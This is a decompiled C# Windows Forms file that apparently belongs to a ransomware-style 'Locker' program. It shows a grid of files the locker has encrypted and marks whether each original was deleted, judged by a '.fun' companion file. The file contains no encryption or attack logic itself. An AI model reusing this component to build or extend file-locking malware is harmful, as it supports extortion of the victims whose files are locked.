using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Main.Tools;

namespace Main;

public class FormEncryptedFiles : Form
{
	private IContainer components;

	private DataGridView dataGridViewEncryptedFiles;

	private DataGridViewTextBoxColumn ColumnDeleted;

	private DataGridViewTextBoxColumn ColumnPath;

	public FormEncryptedFiles()
	{
		InitializeComponent();
	}

	private void FormEncryptedFiles_Load(object sender, EventArgs e)
	{
		foreach (string encryptedFile in Locker.GetEncryptedFiles())
		{
			if (FormEncryptedFiles.smethod_1(FormEncryptedFiles.smethod_0(encryptedFile, ".fun")))
			{
				FormEncryptedFiles.smethod_3(FormEncryptedFiles.smethod_2(dataGridViewEncryptedFiles), new object[2] { "", encryptedFile });
			}
			else
			{
				FormEncryptedFiles.smethod_3(FormEncryptedFiles.smethod_2(dataGridViewEncryptedFiles), new object[2] { "YES", encryptedFile });
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			FormEncryptedFiles.smethod_4((IDisposable)components);
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		dataGridViewEncryptedFiles = FormEncryptedFiles.smethod_5();
		ColumnDeleted = FormEncryptedFiles.smethod_6();
		ColumnPath = FormEncryptedFiles.smethod_6();
		FormEncryptedFiles.smethod_7((ISupportInitialize)dataGridViewEncryptedFiles);
		FormEncryptedFiles.smethod_8((Control)(object)this);
		FormEncryptedFiles.smethod_9(dataGridViewEncryptedFiles, (DataGridViewColumnHeadersHeightSizeMode)2);
		FormEncryptedFiles.smethod_11(FormEncryptedFiles.smethod_10(dataGridViewEncryptedFiles), (DataGridViewColumn[])(object)new DataGridViewColumn[2]
		{
			(DataGridViewColumn)ColumnDeleted,
			(DataGridViewColumn)ColumnPath
		});
		FormEncryptedFiles.smethod_12((Control)(object)dataGridViewEncryptedFiles, (DockStyle)5);
		((Control)dataGridViewEncryptedFiles).set_Location(new Point(0, 0));
		((Control)dataGridViewEncryptedFiles).set_Name("dataGridViewEncryptedFiles");
		((Control)dataGridViewEncryptedFiles).set_Size(new Size(594, 326));
		((Control)dataGridViewEncryptedFiles).set_TabIndex(0);
		((DataGridViewColumn)ColumnDeleted).set_HeaderText("Deleted");
		((DataGridViewColumn)ColumnDeleted).set_Name("ColumnDeleted");
		((DataGridViewBand)ColumnDeleted).set_ReadOnly(true);
		((DataGridViewColumn)ColumnDeleted).set_Width(50);
		((DataGridViewColumn)ColumnPath).set_HeaderText("Path");
		((DataGridViewColumn)ColumnPath).set_Name("ColumnPath");
		((DataGridViewBand)ColumnPath).set_ReadOnly(true);
		((DataGridViewColumn)ColumnPath).set_Width(500);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(594, 326));
		((Control)this).get_Controls().Add((Control)(object)dataGridViewEncryptedFiles);
		((Control)this).set_Name("FormEncryptedFiles");
		((Control)this).set_Text("EncryptedFiles");
		((Form)this).add_Load((EventHandler)FormEncryptedFiles_Load);
		((ISupportInitialize)dataGridViewEncryptedFiles).EndInit();
		((Control)this).ResumeLayout(false);
	}

	static string smethod_0(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static bool smethod_1(string string_0)
	{
		return File.Exists(string_0);
	}

	static DataGridViewRowCollection smethod_2(DataGridView dataGridView_0)
	{
		return dataGridView_0.get_Rows();
	}

	static int smethod_3(DataGridViewRowCollection dataGridViewRowCollection_0, object[] object_0)
	{
		return dataGridViewRowCollection_0.Add(object_0);
	}

	static void smethod_4(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static DataGridView smethod_5()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new DataGridView();
	}

	static DataGridViewTextBoxColumn smethod_6()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new DataGridViewTextBoxColumn();
	}

	static void smethod_7(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_8(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_9(DataGridView dataGridView_0, DataGridViewColumnHeadersHeightSizeMode dataGridViewColumnHeadersHeightSizeMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		dataGridView_0.set_ColumnHeadersHeightSizeMode(dataGridViewColumnHeadersHeightSizeMode_0);
	}

	static DataGridViewColumnCollection smethod_10(DataGridView dataGridView_0)
	{
		return dataGridView_0.get_Columns();
	}

	static void smethod_11(DataGridViewColumnCollection dataGridViewColumnCollection_0, DataGridViewColumn[] dataGridViewColumn_0)
	{
		dataGridViewColumnCollection_0.AddRange(dataGridViewColumn_0);
	}

	static void smethod_12(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}
}
